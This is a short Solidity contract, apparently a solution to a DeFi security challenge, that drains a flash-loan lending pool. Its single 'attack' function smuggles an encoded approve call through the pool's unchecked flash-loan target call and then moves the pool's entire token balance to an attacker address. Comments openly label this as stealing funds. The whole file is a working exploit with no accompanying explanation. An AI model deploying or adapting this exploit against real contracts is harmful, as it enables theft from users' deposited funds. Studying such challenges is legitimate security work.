// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface Lender {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external;
}


contract Exploit3 {
    
    function attack(address attacker, address lender, address token) public {
        // get the balance; tokens we're gonna steal
        uint amount = IERC20(token).balanceOf(lender);

        // craft payload
        bytes memory payload = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);

        // exploit vulnerability and approve this contract to move funds
        Lender(lender).flashLoan(0, address(this), token, payload);

        // steal the funds
        IERC20(token).transferFrom(lender, attacker, amount);

    }



}